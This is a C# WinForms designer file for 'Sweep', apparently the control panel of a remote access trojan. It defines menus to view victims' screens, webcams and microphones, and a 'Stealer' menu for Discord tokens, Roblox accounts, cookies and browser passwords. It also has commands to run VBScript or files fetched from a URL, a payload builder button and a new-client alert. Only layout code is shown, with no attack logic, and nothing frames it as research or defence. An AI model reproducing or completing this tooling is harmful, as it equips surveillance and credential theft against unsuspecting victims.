using System.Drawing;
using System.Windows.Forms;

namespace Sweep.Forms
{
    partial class Sweep
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Sweep));
            this.rat = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.seescreen = new System.Windows.Forms.ToolStripMenuItem();
            this.webcam = new System.Windows.Forms.ToolStripMenuItem();
            this.microphoneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.discordTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.robloxGraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cookiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.passwordsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.everythingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runVBScriptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.openURLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fromPCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.listView1 = new BrightIdeasSoftware.ObjectListView();
            this.portnum = new System.Windows.Forms.Label();
            this.clients = new System.Windows.Forms.Label();
            this.logsview = new BrightIdeasSoftware.ObjectListView();
            this.Time = ((BrightIdeasSoftware.OLVColumn)(new BrightIdeasSoftware.OLVColumn()));
            this.Message = ((BrightIdeasSoftware.OLVColumn)(new BrightIdeasSoftware.OLVColumn()));
            this.Type = ((BrightIdeasSoftware.OLVColumn)(new BrightIdeasSoftware.OLVColumn()));
            this.counter = new Guna.UI2.WinForms.Guna2GradientButton();
            this.usname = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.builder = new Guna.UI2.WinForms.Guna2Button();
            this.logs = new Guna.UI2.WinForms.Guna2Button();
            this.home = new Guna.UI2.WinForms.Guna2Button();
            this.DiskFileDialog = new System.Windows.Forms.OpenFileDialog();
            this.fromURLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rat.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.listView1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.logsview)).BeginInit();
            this.SuspendLayout();
            // 
            // rat
            // 
            this.rat.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.rat.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.seescreen,
            this.webcam,
            this.microphoneToolStripMenuItem,
            this.chatToolStripMenuItem,
            this.stealerToolStripMenuItem,
            this.runVBScriptToolStripMenuItem,
            this.openURLToolStripMenuItem,
            this.runFileToolStripMenuItem});
            this.rat.Name = "rat";
            this.rat.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.rat.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
            this.rat.RenderStyle.ColorTable = null;
            this.rat.RenderStyle.RoundedEdges = true;
            this.rat.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.rat.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.rat.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.rat.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.rat.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.rat.Size = new System.Drawing.Size(181, 202);
            // 
            // seescreen
            // 
            this.seescreen.Image = global::Sweep.Properties.Resources.desktop;
            this.seescreen.Name = "seescreen";
            this.seescreen.Size = new System.Drawing.Size(180, 22);
            this.seescreen.Text = "See Screen";
            this.seescreen.Click += new System.EventHandler(this.seescreen_Click);
            // 
            // webcam
            // 
            this.webcam.Image = global::Sweep.Properties.Resources.camera;
            this.webcam.Name = "webcam";
            this.webcam.Size = new System.Drawing.Size(180, 22);
            this.webcam.Text = "See Webcam";
            this.webcam.Click += new System.EventHandler(this.webcam_Click);
            // 
            // microphoneToolStripMenuItem
            // 
            this.microphoneToolStripMenuItem.Image = global::Sweep.Properties.Resources.microphone;
            this.microphoneToolStripMenuItem.Name = "microphoneToolStripMenuItem";
            this.microphoneToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.microphoneToolStripMenuItem.Text = "Microphone";
            this.microphoneToolStripMenuItem.Click += new System.EventHandler(this.microphoneToolStripMenuItem_Click);
            // 
            // chatToolStripMenuItem
            // 
            this.chatToolStripMenuItem.Image = global::Sweep.Properties.Resources.chat;
            this.chatToolStripMenuItem.Name = "chatToolStripMenuItem";
            this.chatToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.chatToolStripMenuItem.Text = "Chat";
            this.chatToolStripMenuItem.Click += new System.EventHandler(this.chatToolStripMenuItem_Click);
            // 
            // stealerToolStripMenuItem
            // 
            this.stealerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.discordTokenToolStripMenuItem,
            this.robloxGraToolStripMenuItem,
            this.cookiesToolStripMenuItem,
            this.passwordsToolStripMenuItem,
            this.everythingToolStripMenuItem});
            this.stealerToolStripMenuItem.Image = global::Sweep.Properties.Resources.key_chain;
            this.stealerToolStripMenuItem.Name = "stealerToolStripMenuItem";
            this.stealerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.stealerToolStripMenuItem.Text = "Stealer";
            // 
            // discordTokenToolStripMenuItem
            // 
            this.discordTokenToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.discordTokenToolStripMenuItem.Image = global::Sweep.Properties.Resources.discord;
            this.discordTokenToolStripMenuItem.Name = "discordTokenToolStripMenuItem";
            this.discordTokenToolStripMenuItem.Size = new System.Drawing.Size(174, 22);
            this.discordTokenToolStripMenuItem.Text = "Discord Token";
            this.discordTokenToolStripMenuItem.Click += new System.EventHandler(this.discordTokenToolStripMenuItem_Click);
            // 
            // robloxGraToolStripMenuItem
            // 
            this.robloxGraToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.robloxGraToolStripMenuItem.Image = global::Sweep.Properties.Resources.roblox;
            this.robloxGraToolStripMenuItem.Name = "robloxGraToolStripMenuItem";
            this.robloxGraToolStripMenuItem.Size = new System.Drawing.Size(174, 22);
            this.robloxGraToolStripMenuItem.Text = "Roblox Grabber";
            this.robloxGraToolStripMenuItem.Click += new System.EventHandler(this.robloxGraToolStripMenuItem_Click);
            // 
            // cookiesToolStripMenuItem
            // 
            this.cookiesToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.cookiesToolStripMenuItem.Image = global::Sweep.Properties.Resources.cookies;
            this.cookiesToolStripMenuItem.Name = "cookiesToolStripMenuItem";
            this.cookiesToolStripMenuItem.Size = new System.Drawing.Size(174, 22);
            this.cookiesToolStripMenuItem.Text = "Cookies";
            // 
            // passwordsToolStripMenuItem
            // 
            this.passwordsToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.passwordsToolStripMenuItem.Image = global::Sweep.Properties.Resources.chrome;
            this.passwordsToolStripMenuItem.Name = "passwordsToolStripMenuItem";
            this.passwordsToolStripMenuItem.Size = new System.Drawing.Size(174, 22);
            this.passwordsToolStripMenuItem.Text = "Browser Passwords";
            // 
            // everythingToolStripMenuItem
            // 
            this.everythingToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.everythingToolStripMenuItem.Name = "everythingToolStripMenuItem";
            this.everythingToolStripMenuItem.Size = new System.Drawing.Size(174, 22);
            this.everythingToolStripMenuItem.Text = "Everything";
            // 
            // runVBScriptToolStripMenuItem
            // 
            this.runVBScriptToolStripMenuItem.Image = global::Sweep.Properties.Resources.wscript_101;
            this.runVBScriptToolStripMenuItem.Name = "runVBScriptToolStripMenuItem";
            this.runVBScriptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.runVBScriptToolStripMenuItem.Text = "Run VBScript";
            this.runVBScriptToolStripMenuItem.Click += new System.EventHandler(this.runVBScriptToolStripMenuItem_Click);
            // 
            // openURLToolStripMenuItem
            // 
            this.openURLToolStripMenuItem.Image = global::Sweep.Properties.Resources.link;
            this.openURLToolStripMenuItem.Name = "openURLToolStripMenuItem";
            this.openURLToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.openURLToolStripMenuItem.Text = "Open URL";
            this.openURLToolStripMenuItem.Click += new System.EventHandler(this.openURLToolStripMenuItem_Click);
            // 
            // runFileToolStripMenuItem
            // 
            this.runFileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fromPCToolStripMenuItem,
            this.fromURLToolStripMenuItem});
            this.runFileToolStripMenuItem.Image = global::Sweep.Properties.Resources.open_folder;
            this.runFileToolStripMenuItem.Name = "runFileToolStripMenuItem";
            this.runFileToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.runFileToolStripMenuItem.Text = "Run File";
            // 
            // fromPCToolStripMenuItem
            // 
            this.fromPCToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.fromPCToolStripMenuItem.Image = global::Sweep.Properties.Resources.hard_disk;
            this.fromPCToolStripMenuItem.Name = "fromPCToolStripMenuItem";
            this.fromPCToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.fromPCToolStripMenuItem.Text = "From Disk";
            this.fromPCToolStripMenuItem.Click += new System.EventHandler(this.fromPCToolStripMenuItem_Click);
            // 
            // listView1
            // 
            this.listView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.listView1.ContextMenuStrip = this.rat;
            this.listView1.ForeColor = System.Drawing.SystemColors.WindowText;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(4, 3);
            this.listView1.Name = "listView1";
            this.listView1.RowHeight = 25;
            this.listView1.SelectedColumnTint = System.Drawing.Color.FromArgb(((int)(((byte)(15)))), ((int)(((byte)(0)))), ((int)(((byte)(120)))), ((int)(((byte)(215)))));
            this.listView1.ShowGroups = false;
            this.listView1.Size = new System.Drawing.Size(899, 441);
            this.listView1.TabIndex = 1;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            // 
            // portnum
            // 
            this.portnum.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.portnum.AutoSize = true;
            this.portnum.Location = new System.Drawing.Point(173, 448);
            this.portnum.Name = "portnum";
            this.portnum.Size = new System.Drawing.Size(54, 13);
            this.portnum.TabIndex = 2;
            this.portnum.Text = "[ Port %s ]";
            this.portnum.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // clients
            // 
            this.clients.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.clients.AutoSize = true;
            this.clients.Location = new System.Drawing.Point(103, 448);
            this.clients.Name = "clients";
            this.clients.Size = new System.Drawing.Size(66, 13);
            this.clients.TabIndex = 3;
            this.clients.Text = "[ Clients %s ]";
            this.clients.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // logsview
            // 
            this.logsview.AllColumns.Add(this.Time);
            this.logsview.AllColumns.Add(this.Message);
            this.logsview.AllColumns.Add(this.Type);
            this.logsview.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.logsview.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.Time,
            this.Message,
            this.Type});
            this.logsview.FullRowSelect = true;
            this.logsview.HideSelection = false;
            this.logsview.Location = new System.Drawing.Point(4, 3);
            this.logsview.Name = "logsview";
            this.logsview.ShowGroups = false;
            this.logsview.Size = new System.Drawing.Size(899, 441);
            this.logsview.TabIndex = 7;
            this.logsview.UseCompatibleStateImageBehavior = false;
            this.logsview.View = System.Windows.Forms.View.Details;
            // 
            // Time
            // 
            this.Time.AspectName = "Time";
            this.Time.CellPadding = null;
            this.Time.Text = "Time";
            this.Time.Width = 110;
            // 
            // Message
            // 
            this.Message.AspectName = "Message";
            this.Message.CellPadding = null;
            this.Message.FillsFreeSpace = true;
            this.Message.Text = "Message";
            this.Message.Width = 410;
            // 
            // Type
            // 
            this.Type.AspectName = "Type";
            this.Type.CellPadding = null;
            this.Type.Text = "Type";
            // 
            // counter
            // 
            this.counter.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.counter.BorderRadius = 3;
            this.counter.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.counter.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.counter.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.counter.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.counter.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.counter.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.counter.ForeColor = System.Drawing.Color.White;
            this.counter.Location = new System.Drawing.Point(892, 46);
            this.counter.Name = "counter";
            this.counter.Size = new System.Drawing.Size(41, 21);
            this.counter.TabIndex = 8;
            this.counter.Text = "0";
            this.counter.Visible = false;
            // 
            // usname
            // 
            this.usname.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.usname.AutoSize = true;
            this.usname.Location = new System.Drawing.Point(2, 448);
            this.usname.Name = "usname";
            this.usname.Size = new System.Drawing.Size(63, 13);
            this.usname.TabIndex = 9;
            this.usname.Text = "[ Name %s ]";
            this.usname.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // timer1
            // 
            this.timer1.Interval = 1000;
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
            this.notifyIcon1.Text = "New client connected";
            this.notifyIcon1.Visible = true;
            // 
            // builder
            // 
            this.builder.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.builder.Animated = true;
            this.builder.BorderColor = System.Drawing.Color.LightGray;
            this.builder.BorderRadius = 3;
            this.builder.BorderThickness = 1;
            this.builder.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.builder.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.builder.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.builder.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.builder.FillColor = System.Drawing.Color.White;
            this.builder.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.builder.ForeColor = System.Drawing.Color.White;
            this.builder.Image = global::Sweep.Properties.Resources.toolbox;
            this.builder.ImageSize = new System.Drawing.Size(25, 25);
            this.builder.Location = new System.Drawing.Point(908, 90);
            this.builder.Name = "builder";
            this.builder.PressedColor = System.Drawing.Color.Gainsboro;
            this.builder.Size = new System.Drawing.Size(72, 40);
            this.builder.TabIndex = 6;
            this.builder.Click += new System.EventHandler(this.builder_Click);
            // 
            // logs
            // 
            this.logs.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.logs.Animated = true;
            this.logs.BorderColor = System.Drawing.Color.LightGray;
            this.logs.BorderRadius = 3;
            this.logs.BorderThickness = 1;
            this.logs.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.logs.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.logs.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.logs.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.logs.FillColor = System.Drawing.Color.White;
            this.logs.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logs.ForeColor = System.Drawing.Color.White;
            this.logs.Image = global::Sweep.Properties.Resources.text_document;
            this.logs.ImageSize = new System.Drawing.Size(25, 25);
            this.logs.Location = new System.Drawing.Point(908, 46);
            this.logs.Name = "logs";
            this.logs.PressedColor = System.Drawing.Color.Gainsboro;
            this.logs.Size = new System.Drawing.Size(72, 40);
            this.logs.TabIndex = 5;
            this.logs.Click += new System.EventHandler(this.logs_Click);
            // 
            // home
            // 
            this.home.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.home.Animated = true;
            this.home.BorderColor = System.Drawing.Color.LightGray;
            this.home.BorderRadius = 3;
            this.home.BorderThickness = 1;
            this.home.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.home.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.home.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.home.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.home.FillColor = System.Drawing.Color.White;
            this.home.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.home.ForeColor = System.Drawing.Color.White;
            this.home.Image = global::Sweep.Properties.Resources.house;
            this.home.Location = new System.Drawing.Point(908, 3);
            this.home.Name = "home";
            this.home.PressedColor = System.Drawing.Color.Gainsboro;
            this.home.Size = new System.Drawing.Size(72, 40);
            this.home.TabIndex = 4;
            this.home.Click += new System.EventHandler(this.home_Click);
            // 
            // DiskFileDialog
            // 
            this.DiskFileDialog.DefaultExt = "exe";
            this.DiskFileDialog.Filter = "All files|*.*";
            this.DiskFileDialog.Multiselect = true;
            // 
            // fromURLToolStripMenuItem
            // 
            this.fromURLToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.fromURLToolStripMenuItem.Image = global::Sweep.Properties.Resources.link;
            this.fromURLToolStripMenuItem.Name = "fromURLToolStripMenuItem";
            this.fromURLToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.fromURLToolStripMenuItem.Text = "From URL";
            this.fromURLToolStripMenuItem.Click += new System.EventHandler(this.fromURLToolStripMenuItem_Click);
            // 
            // Sweep
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.ClientSize = new System.Drawing.Size(983, 467);
            this.Controls.Add(this.usname);
            this.Controls.Add(this.counter);
            this.Controls.Add(this.builder);
            this.Controls.Add(this.logs);
            this.Controls.Add(this.home);
            this.Controls.Add(this.clients);
            this.Controls.Add(this.portnum);
            this.Controls.Add(this.listView1);
            this.Controls.Add(this.logsview);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Sweep";
            this.Opacity = 0D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Sweep";
            this.Load += new System.EventHandler(this.Sweep_Load);
            this.rat.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.listView1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.logsview)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private Guna.UI2.WinForms.Guna2ContextMenuStrip rat;
        private System.Windows.Forms.ToolStripMenuItem seescreen;
        private BrightIdeasSoftware.ObjectListView listView1;
        private Label portnum;
        private Label clients;
        private ToolStripMenuItem webcam;
        private ToolStripMenuItem microphoneToolStripMenuItem;
        private ToolStripMenuItem chatToolStripMenuItem;
        private Guna.UI2.WinForms.Guna2Button home;
        private Guna.UI2.WinForms.Guna2Button logs;
        private Guna.UI2.WinForms.Guna2Button builder;
        private BrightIdeasSoftware.ObjectListView logsview;
        private BrightIdeasSoftware.OLVColumn Time;
        private BrightIdeasSoftware.OLVColumn Message;
        private BrightIdeasSoftware.OLVColumn Type;
        private Guna.UI2.WinForms.Guna2GradientButton counter;
        private ToolStripMenuItem stealerToolStripMenuItem;
        private ToolStripMenuItem discordTokenToolStripMenuItem;
        private ToolStripMenuItem cookiesToolStripMenuItem;
        private ToolStripMenuItem passwordsToolStripMenuItem;
        private ToolStripMenuItem runVBScriptToolStripMenuItem;
        private ToolStripMenuItem everythingToolStripMenuItem;
        private ToolStripMenuItem robloxGraToolStripMenuItem;
        private Label usname;
        private Timer timer1;
        private ToolStripMenuItem openURLToolStripMenuItem;
        private NotifyIcon notifyIcon1;
        private ToolStripMenuItem runFileToolStripMenuItem;
        private ToolStripMenuItem fromPCToolStripMenuItem;
        private OpenFileDialog DiskFileDialog;
        private ToolStripMenuItem fromURLToolStripMenuItem;
    }
}